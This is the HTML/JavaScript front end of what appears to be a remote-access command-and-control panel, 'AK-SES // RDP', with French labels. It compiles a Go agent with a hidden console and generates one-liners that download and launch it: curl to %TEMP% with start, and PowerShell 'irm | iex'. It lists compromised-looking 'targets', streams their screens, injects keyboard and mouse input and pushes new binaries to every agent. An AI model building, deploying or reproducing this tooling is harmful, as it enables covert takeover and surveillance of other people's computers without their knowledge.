<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AK-SES</title>
    <style>
        :root {
            --bg: #545e60;
            --pane-bg: #2a3536;
            --mid: #162326;
            --fg: #ebe6ca;
            --lnclr: #cdccb2;
            --acc: #97b1aa;
            --onl: #4ade80;
            --dngr: #ef4444;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            border-radius: 3px;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg);
            color: var(--fg);
            display: flex;
            height: 100vh;
            overflow: hidden;
            font-size: 13px;
        }

        /* SIDEBAR */
        #sdbr {
            width: 320px;
            min-width: 320px;
            background-color: var(--pane-bg);
            border-right: 1px solid var(--lnclr);
            display: flex;
            flex-direction: column;
            border-radius: 0;
        }

        .hdr {
            padding: 14px 16px;
            background: var(--mid);
            border-bottom: 1px solid var(--lnclr);
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-radius: 0;
        }

        .hdr-ttl {
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            color: var(--fg);
        }

        .hdr-sub {
            font-size: 10px;
            color: var(--lnclr);
            opacity: 0.7;
            font-family: ui-monospace, monospace;
        }

        /* SECTION HEADERS */
        .sctn-lbl {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-weight: 600;
            opacity: 0.7;
            color: var(--fg);
            margin-bottom: 6px;
        }

        /* AGENT BUILDER */
        .bld-box {
            padding: 10px 12px;
            border-bottom: 1px solid var(--lnclr);
            background: rgba(0, 0, 0, 0.22);
            border-radius: 0;
        }

        .bld-hdr {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            user-select: none;
        }

        .inp-lbl {
            font-size: 10px;
            font-family: ui-monospace, monospace;
            color: var(--lnclr);
            opacity: 0.8;
            margin-bottom: 4px;
            text-transform: uppercase;
        }

        .inp-row {
            display: flex;
            gap: 4px;
            margin-bottom: 6px;
        }

        .inp-row input {
            flex: 1;
            background: var(--mid);
            border: 1px solid var(--lnclr);
            color: var(--fg);
            padding: 4px 6px;
            font-family: ui-monospace, monospace;
            font-size: 11px;
            outline: none;
        }

        .inp-row input:focus {
            border-color: var(--acc);
            box-shadow: 0 0 4px rgba(151, 177, 170, 0.4);
        }

        .bld-opts {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 10px;
            font-family: ui-monospace, monospace;
            color: var(--fg);
            margin-bottom: 8px;
        }

        .chk-lbl {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
            user-select: none;
        }

        .chk-lbl input {
            cursor: pointer;
        }

        .cmp-tag {
            font-size: 9px;
            color: var(--acc);
            opacity: 0.85;
            font-family: ui-monospace, monospace;
        }

        .bld-actions {
            display: flex;
            gap: 4px;
            margin-bottom: 6px;
        }

        .bld-btn-main {
            flex: 1;
            background: var(--mid);
            color: var(--fg);
            border: 1px solid var(--lnclr);
            padding: 6px 4px;
            font-size: 10px;
            font-weight: 700;
        }

        .bld-btn-main:hover:not(:disabled) {
            background: var(--acc);
            color: var(--mid);
            border-color: var(--fg);
        }

        .bld-btn-dl {
            background: var(--mid);
            color: var(--fg);
            border: 1px solid var(--lnclr);
            padding: 6px 8px;
            font-size: 10px;
            font-weight: 700;
        }

        .bld-btn-dl.ready {
            background: var(--onl);
            color: #0d1517;
            border-color: #fff;
            font-weight: 800;
        }

        .bld-st-box {
            font-family: ui-monospace, monospace;
            font-size: 10px;
            padding: 4px 6px;
            background: var(--mid);
            border: 1px dashed var(--lnclr);
            color: var(--lnclr);
            opacity: 0.9;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .bld-st-box.ok {
            color: var(--onl);
            border-color: var(--onl);
        }

        .bld-st-box.err {
            color: var(--dngr);
            border-color: var(--dngr);
        }

        /* DEPLOYMENT PANE */
        .dply-box {
            padding: 10px 12px;
            border-bottom: 1px solid var(--lnclr);
            background: rgba(0, 0, 0, 0.15);
            border-radius: 0;
        }

        .tb-nav {
            display: flex;
            gap: 4px;
            margin-bottom: 6px;
        }

        .tb-btn {
            background: var(--mid);
            color: var(--fg);
            border: 1px solid var(--lnclr);
            padding: 3px 8px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            text-transform: uppercase;
        }

        .tb-btn.active {
            background: var(--acc);
            color: var(--mid);
            border-color: var(--fg);
        }

        .cde-box {
            background: var(--mid);
            border: 1px solid var(--lnclr);
            padding: 8px;
            font-family: ui-monospace, "Cascadia Code", monospace;
            font-size: 11px;
            color: var(--acc);
            word-break: break-all;
            user-select: all;
            cursor: pointer;
            margin-bottom: 4px;
        }

        .cde-box:hover {
            filter: brightness(1.15);
        }

        /* TARGETS LIST */
        #tgt-lst {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            list-style: none;
            scrollbar-width: thin;
        }

        .tgt-itm {
            background: var(--mid);
            border: 1px solid var(--lnclr);
            padding: 8px 10px;
            margin-bottom: 6px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: filter .15s ease;
        }

        .tgt-itm:hover {
            filter: brightness(1.2);
        }

        .tgt-itm.active {
            background: var(--acc);
            color: var(--mid);
            border-color: var(--fg);
            font-weight: 700;
        }

        .tgt-itm.active .tgt-dtls {
            color: var(--mid);
            opacity: 0.85;
        }

        .tgt-nm {
            font-size: 12px;
            font-weight: 600;
        }

        .tgt-dtls {
            font-size: 10px;
            color: var(--lnclr);
            opacity: 0.7;
            font-family: ui-monospace, monospace;
            margin-top: 2px;
        }

        /* STATUS DOT */
        .st-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #666;
            flex-shrink: 0;
        }

        .st-dot.active {
            background: var(--onl);
            box-shadow: 0 0 5px var(--onl);
        }

        /* MAIN VIEWPORT */
        #main {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: var(--mid);
            position: relative;
            border-radius: 0;
        }

        /* TOPBAR */
        #tpbr {
            height: 42px;
            background: var(--pane-bg);
            border-bottom: 1px solid var(--lnclr);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 14px;
            border-radius: 0;
        }

        .st-lbl {
            font-size: 11px;
            font-family: ui-monospace, monospace;
            color: var(--fg);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .actn-grp {
            display: flex;
            gap: 6px;
        }

        button {
            background: var(--mid);
            color: var(--fg);
            border: 1px solid var(--lnclr);
            padding: 5px 10px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            text-transform: uppercase;
            white-space: nowrap;
            transition: filter .15s ease;
        }

        button:hover:not(:disabled) {
            filter: brightness(1.2);
        }

        button.active {
            background: var(--acc);
            color: var(--mid);
            border-color: var(--fg);
            font-weight: 700;
        }

        /* CANVAS STAGE */
        #cnvs-cntnr {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            background: #0d1517;
        }

        canvas {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            border: 1px solid var(--lnclr);
            cursor: default;
        }

        canvas.ctrl-on {
            cursor: crosshair;
        }

        #plchldr {
            position: absolute;
            color: var(--lnclr);
            font-size: 12px;
            font-family: ui-monospace, monospace;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            opacity: 0.6;
        }
    </style>
</head>
<body>

    <!-- SIDEBAR -->
    <div id="sdbr">
        <div class="hdr">
            <div>
                <div class="hdr-ttl">AK-SES // RDP</div>
                <div class="hdr-sub">SYS_ADM_V1</div>
            </div>
            <div class="st-dot active" title="srv_st: onl"></div>
        </div>

        <!-- AGENT BUILDER -->
        <div class="bld-box">
            <div class="bld-hdr" onclick="tgl_bld()">
                <div class="sctn-lbl" style="margin-bottom:0;">BUILD_AGENT // COMPILATEUR</div>
                <span id="bld-tgl-icon" style="font-size:10px; opacity:0.8;">[-]</span>
            </div>
            
            <div id="bld-body">
                <div class="inp-lbl" style="margin-top:6px;">SRV_HOST / DOMAIN:</div>
                <div class="inp-row">
                    <input type="text" id="bld-srv-inp" placeholder="domain.com or IP:port" spellcheck="false" oninput="on_srv_inp_change()" />
                    <button id="btn-rst-host" onclick="rst_bld_host()" title="Utiliser le host actuel">[ CURR ]</button>
                </div>

                <div class="bld-opts">
                    <label class="chk-lbl">
                        <input type="checkbox" id="bld-opt-gui" checked />
                        <span>HIDE_CONSOLE (GUI)</span>
                    </label>
                    <span id="bld-cmp-tag" class="cmp-tag">[ GO: ... ]</span>
                </div>

                <div class="bld-actions">
                    <button id="btn-compile" class="bld-btn-main" onclick="start_compile()">[ COMPILER AGENT ]</button>
                    <button id="btn-dl-agent" class="bld-btn-dl" onclick="download_agent()">[ DL EXE ]</button>
                </div>

                <div id="bld-status" class="bld-st-box">IDLE_READY</div>
            </div>
        </div>

        <!-- UPDATES MANAGER -->
        <div class="bld-box">
            <div class="bld-hdr" onclick="tgl_upd()">
                <div class="sctn-lbl" style="margin-bottom:0;">UPDATES // GITHUB RELEASE</div>
                <span id="upd-tgl-icon" style="font-size:10px; opacity:0.8;">[-]</span>
            </div>
            
            <div id="upd-body">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-top:6px; margin-bottom:6px;">
                    <div style="font-size:10px; font-family:ui-monospace, monospace; color:var(--lnclr);">
                        LOCAL: <span id="lbl-srv-ver" style="color:var(--fg); font-weight:700;">v1.1.0</span> // GIT: <span id="lbl-git-ver" style="color:var(--acc);">--</span>
                    </div>
                    <button class="tb-btn" onclick="check_updates(true)" style="padding:2px 6px; font-size:9px;" title="Interroger GitHub Releases">[ CHECK MAJ ]</button>
                </div>

                <div class="bld-actions">
                    <button id="btn-upd-all" class="bld-btn-main" onclick="apply_update_all()" style="display:none;">[ UPDATE ALL AGENTS ]</button>
                    <button id="btn-push-local" class="bld-btn-dl" onclick="push_local_agent()" title="Diffuser agent.exe compile localement aux agents connectes">[ PUSH LOCAL ]</button>
                </div>

                <div id="upd-status" class="bld-st-box">EN ATTENTE DE VERIFICATION</div>
            </div>
        </div>

        <!-- DEPLOYMENT CMD -->
        <div class="dply-box">
            <div class="sctn-lbl">DPLY_TGT</div>
            <div class="tb-nav">
                <button class="tb-btn active" id="btn-tb-cmd" onclick="swtch_tb('cmd')">CMD</button>
                <button class="tb-btn" id="btn-tb-ps" onclick="swtch_tb('ps')">PS1</button>
            </div>
            <div id="cde-bx" class="cde-box" onclick="cp_cde()" title="CLICK_TO_CP">...</div>
        </div>

        <!-- TARGETS -->
        <div style="padding: 10px 12px 0 12px;">
            <div class="sctn-lbl">TGTS_ACTV</div>
        </div>
        <ul id="tgt-lst"></ul>
    </div>

    <!-- MAIN -->
    <div id="main">
        <div id="tpbr">
            <div class="st-lbl" id="st-txt">NO_TGT_SLCTD</div>
            <div class="actn-grp">
                <div id="disp-grp" style="display:inline-flex; gap:3px;"></div>
                <button id="btn-ctrl" onclick="tgl_ctrl()">[ CTRL: OFF ]</button>
                <button onclick="snd_spc_ky('Enter')">[ ENTER ]</button>
                <button onclick="snd_spc_ky('Backspace')">[ BKSP ]</button>
                <button onclick="snd_spc_ky('Escape')">[ ESC ]</button>
            </div>
        </div>

        <div id="cnvs-cntnr">
            <div id="plchldr">[ IDLE_WAITING_STREAM ]</div>
            <canvas id="scrn-cnvs" tabindex="0"></canvas>
        </div>
    </div>

    <script>
        const hst = window.location.host;
        let cur_tb = 'cmd';
        let cur_tgt_id = null;
        let ws_adm = null;
        let ctrl_on = false;
        let cur_disp = 0;
        let cur_disps = [];

        const cnvs = document.getElementById('scrn-cnvs');
        const ctx = cnvs.getContext('2d');
        const plchldr = document.getElementById('plchldr');
        const st_txt = document.getElementById('st-txt');
        const btn_ctrl = document.getElementById('btn-ctrl');
        const cde_bx = document.getElementById('cde-bx');
        const disp_grp = document.getElementById('disp-grp');
        const bld_srv_inp = document.getElementById('bld-srv-inp');
        const bld_status = document.getElementById('bld-status');
        const bld_cmp_tag = document.getElementById('bld-cmp-tag');
        const btn_compile = document.getElementById('btn-compile');
        const btn_dl_agent = document.getElementById('btn-dl-agent');
        const bld_opt_gui = document.getElementById('bld-opt-gui');

        function get_active_srv() {
            let s = bld_srv_inp ? bld_srv_inp.value.trim() : '';
            if (!s) s = hst;
            s = s.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
            return s || hst;
        }

        function upd_cde() {
            const pr = window.location.protocol;
            const targetSrv = get_active_srv();
            const now = Date.now();
            if (cur_tb === 'cmd') {
                cde_bx.innerText = `taskkill /f /im agent.exe >nul 2>&1 & curl -s -o "%TEMP%\\agent.exe" "${pr}//${hst}/dl/agent.exe?t=${now}" && start "" "%TEMP%\\agent.exe" -server ${targetSrv}`;
            } else {
                cde_bx.innerText = `irm "${pr}//${hst}/dl/run.ps1?server=${encodeURIComponent(targetSrv)}&t=${now}" | iex`;
            }
        }

        function on_srv_inp_change() {
            upd_cde();
        }

        function rst_bld_host() {
            if (bld_srv_inp) {
                bld_srv_inp.value = hst;
                on_srv_inp_change();
            }
        }

        function tgl_bld() {
            const b = document.getElementById('bld-body');
            const ico = document.getElementById('bld-tgl-icon');
            if (b.style.display === 'none') {
                b.style.display = 'block';
                ico.innerText = '[-]';
            } else {
                b.style.display = 'none';
                ico.innerText = '[+]';
            }
        }

        async function init_builder() {
            if (bld_srv_inp && !bld_srv_inp.value) {
                bld_srv_inp.value = hst;
            }
            upd_cde();

            try {
                const res = await fetch('/api/compiler-info');
                if (res.ok) {
                    const info = await res.json();
                    if (info.go_installed) {
                        bld_cmp_tag.innerText = '[ GO: OK ]';
                        bld_cmp_tag.title = info.go_version || 'Go installé';
                        bld_cmp_tag.style.color = 'var(--onl)';
                    } else {
                        bld_cmp_tag.innerText = '[ GO: N/A ]';
                        bld_cmp_tag.title = info.go_version || 'Go non détecté';
                        bld_cmp_tag.style.color = 'var(--dngr)';
                    }

                    if (info.agent_exists) {
                        const mb = (info.agent_size / (1024 * 1024)).toFixed(2);
                        bld_status.innerText = `BINAIRE PRÊT (${mb} MB)`;
                        btn_dl_agent.classList.add('ready');
                    } else {
                        bld_status.innerText = 'NON COMPILÉ';
                    }
                }
            } catch (e) {
                bld_cmp_tag.innerText = '[ GO: ERR ]';
            }
        }

        let latest_git_ver = null;
        const lbl_srv_ver = document.getElementById('lbl-srv-ver');
        const lbl_git_ver = document.getElementById('lbl-git-ver');
        const btn_upd_all = document.getElementById('btn-upd-all');
        const upd_status = document.getElementById('upd-status');

        function tgl_upd() {
            const b = document.getElementById('upd-body');
            const ico = document.getElementById('upd-tgl-icon');
            if (b.style.display === 'none') {
                b.style.display = 'block';
                ico.innerText = '[-]';
            } else {
                b.style.display = 'none';
                ico.innerText = '[+]';
            }
        }

        async function check_updates(manual = false) {
            if (manual && upd_status) {
                upd_status.className = 'bld-st-box';
                upd_status.innerText = 'VERIFICATION GITHUB EN COURS...';
            }

            try {
                const res = await fetch('/api/updates/check');
                const data = await res.json();
                if (data.success) {
                    latest_git_ver = data.latest_version;
                    if (lbl_srv_ver) lbl_srv_ver.innerText = data.current_server_version || 'v1.0.0';
                    if (lbl_git_ver) lbl_git_ver.innerText = data.latest_version || '--';

                    if (data.update_available) {
                        btn_upd_all.style.display = 'block';
                        btn_upd_all.innerText = `[ MAJ AGENTS VERS ${data.latest_version} ]`;
                        upd_status.className = 'bld-st-box ok';
                        upd_status.innerText = `NOUVELLE VERSION ${data.latest_version} DISPONIBLE (${data.outdated_agents_count} AGENTS A METTRE A JOUR)`;
                    } else {
                        btn_upd_all.style.display = 'none';
                        upd_status.className = 'bld-st-box';
                        upd_status.innerText = `A JOUR (${data.current_server_version})`;
                    }
                } else {
                    if (manual) {
                        upd_status.className = 'bld-st-box err';
                        upd_status.innerText = `! ${data.error || 'Erreur verification GitHub'}`;
                    }
                }
            } catch (err) {
                if (manual) {
                    upd_status.className = 'bld-st-box err';
                    upd_status.innerText = `! Erreur reseau: ${err.message}`;
                }
            }
        }

        async function apply_update_all() {
            if (!confirm(`Confirmer la mise a jour de tous les agents connectes vers ${latest_git_ver} ?`)) {
                return;
            }

            btn_upd_all.disabled = true;
            btn_upd_all.innerText = '[ TELECHARGEMENT & DIFFUSION... ]';
            upd_status.className = 'bld-st-box';
            upd_status.innerText = `TELECHARGEMENT RELEASE ${latest_git_ver}...`;

            try {
                const res = await fetch('/api/updates/apply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        download_release: true,
                        version: latest_git_ver
                    })
                });

                const data = await res.json();
                if (data.success) {
                    upd_status.className = 'bld-st-box ok';
                    upd_status.innerText = `[ OK ] ORDRE TRANSMIS A ${data.count} AGENT(S)`;
                    btn_upd_all.style.display = 'none';
                    rfrsh_tgts();
                } else {
                    upd_status.className = 'bld-st-box err';
                    upd_status.innerText = `! ${data.error || 'Erreur application'}`;
                }
            } catch (err) {
                upd_status.className = 'bld-st-box err';
                upd_status.innerText = `! Erreur reseau: ${err.message}`;
            } finally {
                btn_upd_all.disabled = false;
            }
        }

        async function push_local_agent() {
            if (!confirm('Diffuser le binaire agent.exe local a tous les agents connectes ?')) {
                return;
            }

            upd_status.className = 'bld-st-box';
            upd_status.innerText = 'DIFFUSION AGENT LOCAL EN COURS...';

            try {
                const res = await fetch('/api/updates/push-local', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });

                const data = await res.json();
                if (data.success) {
                    upd_status.className = 'bld-st-box ok';
                    upd_status.innerText = `[ OK ] AGENT LOCAL DIFFUSE A ${data.count} MACHINE(S)`;
                    rfrsh_tgts();
                } else {
                    upd_status.className = 'bld-st-box err';
                    upd_status.innerText = `! ${data.error || 'Erreur diffusion'}`;
                }
            } catch (err) {
                upd_status.className = 'bld-st-box err';
                upd_status.innerText = `! Erreur reseau: ${err.message}`;
            }
        }

        async function update_single_agent(agentId) {
            if (!confirm(`Mettre a jour l'agent ${agentId} vers ${latest_git_ver || 'latest'} ?`)) {
                return;
            }

            try {
                const res = await fetch('/api/updates/apply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        agent_id: agentId,
                        download_release: false,
                        version: latest_git_ver || 'latest'
                    })
                });
                const data = await res.json();
                if (data.success) {
                    upd_status.className = 'bld-st-box ok';
                    upd_status.innerText = `[ OK ] ORDRE MAJ TRANSMIS A ${agentId}`;
                } else {
                    alert(`Erreur: ${data.error}`);
                }
            } catch (err) {
                alert(`Erreur reseau: ${err.message}`);
            }
        }

        async function start_compile() {
            const targetSrv = get_active_srv();
            const hideGui = bld_opt_gui ? bld_opt_gui.checked : true;

            btn_compile.disabled = true;
            btn_compile.innerText = '[ COMPILATION... ]';
            bld_status.className = 'bld-st-box';
            bld_status.innerText = `COMPILATION POUR ${targetSrv}...`;

            try {
                const res = await fetch('/api/compile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        server: targetSrv,
                        hide_console: hideGui,
                        arch: 'amd64'
                    })
                });

                const data = await res.json();
                if (data.success) {
                    const mb = (data.size / (1024 * 1024)).toFixed(2);
                    bld_status.className = 'bld-st-box ok';
                    bld_status.innerText = `[ OK ] COMPILE (${mb} MB, ${data.duration_ms}ms)`;
                    btn_dl_agent.classList.add('ready');
                    upd_cde();
                } else {
                    bld_status.className = 'bld-st-box err';
                    bld_status.innerText = `! ${data.error || 'Erreur inconnue'}`;
                    if (data.output) console.error("Compiler output:", data.output);
                }
            } catch (err) {
                bld_status.className = 'bld-st-box err';
                bld_status.innerText = `! Erreur réseau: ${err.message}`;
            } finally {
                btn_compile.disabled = false;
                btn_compile.innerText = '[ COMPILER AGENT ]';
            }
        }

        function download_agent() {
            window.location.href = `/dl/agent.exe?t=${Date.now()}`;
        }

        init_builder();
        check_updates(false);
        setInterval(() => check_updates(false), 120000);

        function swtch_tb(tb) {
            cur_tb = tb;
            document.getElementById('btn-tb-cmd').classList.toggle('active', tb === 'cmd');
            document.getElementById('btn-tb-ps').classList.toggle('active', tb === 'ps');
            upd_cde();
        }

        function cp_cde() {
            upd_cde();
            navigator.clipboard.writeText(cde_bx.innerText);
            const prv = cde_bx.innerText;
            cde_bx.innerText = '[ COPIED_TO_CLIPBOARD ]';
            setTimeout(() => { cde_bx.innerText = prv; }, 1000);
        }

        function reset_active_stream(reason) {
            cur_tgt_id = null;
            if (ws_adm) {
                try { ws_adm.close(); } catch(e) {}
                ws_adm = null;
            }
            if (ctrl_on) {
                tgl_ctrl();
            }
            st_txt.innerText = reason || 'NO_TGT_SLCTD';
            plchldr.style.display = 'block';
            plchldr.innerText = `[ ${reason || 'IDLE_WAITING_STREAM'} ]`;
            ctx.clearRect(0, 0, cnvs.width, cnvs.height);
            disp_grp.innerHTML = '';
            document.querySelectorAll('.tgt-itm').forEach(el => el.classList.remove('active'));
        }

        async function rfrsh_tgts() {
            try {
                const res = await fetch('/api/agents');
                const lst = await res.json();
                const cntnr = document.getElementById('tgt-lst');
                cntnr.innerHTML = '';

                let activeFound = false;

                if (lst.length === 0) {
                    cntnr.innerHTML = '<li style="padding:10px; color:var(--lnclr); font-size:11px; opacity:0.6; text-transform:uppercase;">[ NO_TGT_CONN ]</li>';
                }

                lst.forEach(a => {
                    if (a.id === cur_tgt_id) {
                        activeFound = true;
                    }
                    const isOutdated = latest_git_ver && a.version && a.version !== latest_git_ver;
                    const updBtnHtml = isOutdated ? `<button class="tb-btn" style="padding:1px 5px; font-size:9px; margin-right:4px;" onclick="event.stopPropagation(); update_single_agent('${a.id}')" title="Mettre a jour vers ${latest_git_ver}">[ UPD ]</button>` : '';
                    const li = document.createElement('li');
                    li.className = 'tgt-itm' + (a.id === cur_tgt_id ? ' active' : '');
                    li.innerHTML = `
                        <div>
                            <div class="tgt-nm">${a.hostname || a.id}</div>
                            <div class="tgt-dtls">id:${a.id} // ${a.os} // v:${a.version || 'v1.0.0'}</div>
                        </div>
                        <div style="display:flex; align-items:center;">
                            ${updBtnHtml}
                            <div class="st-dot active"></div>
                        </div>
                    `;
                    li.onclick = () => slct_tgt(a.id);
                    cntnr.appendChild(li);
                });

                // Si la machine sélectionnée n'est plus dans la liste connectée, réinitialiser immédiatement le flux
                if (cur_tgt_id && !activeFound) {
                    reset_active_stream(`MACHINE_HORS_LIGNE: ${cur_tgt_id}`);
                }
            } catch (e) {
                console.error(e);
            }
        }

        setInterval(rfrsh_tgts, 1500);
        rfrsh_tgts();

        function slct_tgt(id) {
            if (cur_tgt_id === id && ws_adm) return;
            cur_tgt_id = id;
            rfrsh_tgts();

            if (ws_adm) {
                try { ws_adm.close(); } catch(e) {}
            }

            st_txt.innerText = `CONN_REQ: ${id}`;
            plchldr.style.display = 'block';
            plchldr.innerText = '[ STREAM_SYNC... ]';
            ctx.clearRect(0, 0, cnvs.width, cnvs.height);

            const prtcl = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws_adm = new WebSocket(`${prtcl}//${hst}/ws/admin?id=${id}`);
            ws_adm.binaryType = 'blob';

            ws_adm.onopen = () => {
                st_txt.innerText = `ACTIVE_TGT: ${id}`;
            };

            ws_adm.onmessage = async (evt) => {
                if (evt.data instanceof Blob) {
                    const bmp = await createImageBitmap(evt.data);
                    plchldr.style.display = 'none';

                    if (cnvs.width !== bmp.width || cnvs.height !== bmp.height) {
                        cnvs.width = bmp.width;
                        cnvs.height = bmp.height;
                    }
                    ctx.drawImage(bmp, 0, 0);
                } else if (typeof evt.data === 'string') {
                    try {
                        const msg = JSON.parse(evt.data);
                        if (msg.type === 'displays') {
                            render_disps(msg.displays);
                        } else if (msg.type === 'target_disconnected') {
                            reset_active_stream(`MACHINE_HORS_LIGNE: ${msg.agent_id}`);
                        }
                    } catch (e) {}
                }
            };

            ws_adm.onclose = () => {
                if (cur_tgt_id === id) {
                    reset_active_stream(`CONN_FERMÉE: ${id}`);
                }
            };
        }

        function render_disps(disps) {
            cur_disps = disps || [];
            disp_grp.innerHTML = '';
            if (cur_disps.length <= 1) return;

            cur_disps.forEach((d) => {
                const b = document.createElement('button');
                b.innerText = `[ SCRN ${d.index + 1} ]`;
                b.className = (d.index === cur_disp ? 'active' : '');
                b.onclick = () => swtch_disp(d.index);
                disp_grp.appendChild(b);
            });
        }

        function swtch_disp(idx) {
            cur_disp = idx;
            document.querySelectorAll('#disp-grp button').forEach((b, i) => {
                b.classList.toggle('active', i === idx);
            });
            if (ws_adm && ws_adm.readyState === WebSocket.OPEN) {
                ws_adm.send(JSON.stringify({ type: 'select_display', display: idx }));
            }
        }

        function tgl_ctrl() {
            ctrl_on = !ctrl_on;
            if (ctrl_on) {
                btn_ctrl.classList.add('active');
                btn_ctrl.innerText = '[ CTRL: ON ]';
                cnvs.classList.add('ctrl-on');
                cnvs.focus();
            } else {
                btn_ctrl.classList.remove('active');
                btn_ctrl.innerText = '[ CTRL: OFF ]';
                cnvs.classList.remove('ctrl-on');
            }
        }

        function get_crds(e) {
            const rc = cnvs.getBoundingClientRect();
            const x = (e.clientX - rc.left) / rc.width;
            const y = (e.clientY - rc.top) / rc.height;
            return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
        }

        cnvs.addEventListener('mousemove', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            const pt = get_crds(e);
            ws_adm.send(JSON.stringify({ type: 'mouse_move', display: cur_disp, x: pt.x, y: pt.y }));
        });

        cnvs.addEventListener('mousedown', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            e.preventDefault();
            const pt = get_crds(e);
            const btns = ['left', 'middle', 'right'];
            ws_adm.send(JSON.stringify({
                type: 'mouse_down',
                display: cur_disp,
                button: btns[e.button] || 'left',
                x: pt.x,
                y: pt.y
            }));
        });

        cnvs.addEventListener('mouseup', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            e.preventDefault();
            const pt = get_crds(e);
            const btns = ['left', 'middle', 'right'];
            ws_adm.send(JSON.stringify({
                type: 'mouse_up',
                display: cur_disp,
                button: btns[e.button] || 'left',
                x: pt.x,
                y: pt.y
            }));
        });

        cnvs.addEventListener('wheel', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            e.preventDefault();
            const dlt = e.deltaY > 0 ? -120 : 120;
            ws_adm.send(JSON.stringify({ type: 'mouse_scroll', deltaY: dlt }));
        });

        cnvs.addEventListener('contextmenu', (e) => {
            if (ctrl_on) e.preventDefault();
        });

        const VK_MAP = {
            'Enter': 0x0D,
            'Backspace': 0x08,
            'Tab': 0x09,
            'Escape': 0x1B,
            'Space': 0x20,
            'ArrowLeft': 0x25,
            'ArrowUp': 0x26,
            'ArrowRight': 0x27,
            'ArrowDown': 0x28,
            'Delete': 0x2E,
            'ShiftLeft': 0x10,
            'ShiftRight': 0x10,
            'ControlLeft': 0x11,
            'ControlRight': 0x11,
            'AltLeft': 0x12,
            'AltRight': 0x12
        };

        window.addEventListener('keydown', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            if (VK_MAP[e.code]) {
                e.preventDefault();
                ws_adm.send(JSON.stringify({ type: 'key_down', code: VK_MAP[e.code] }));
            } else if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
                ws_adm.send(JSON.stringify({ type: 'key_text', text: e.key }));
            }
        });

        window.addEventListener('keyup', (e) => {
            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            if (VK_MAP[e.code]) {
                ws_adm.send(JSON.stringify({ type: 'key_up', code: VK_MAP[e.code] }));
            }
        });

        function snd_spc_ky(ky) {
            if (!ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
            const cde = VK_MAP[ky];
            if (cde) {
                ws_adm.send(JSON.stringify({ type: 'key_down', code: cde }));
                setTimeout(() => {
                    ws_adm.send(JSON.stringify({ type: 'key_up', code: cde }));
                }, 50);
            }
        }
    </script>
</body>
</html>
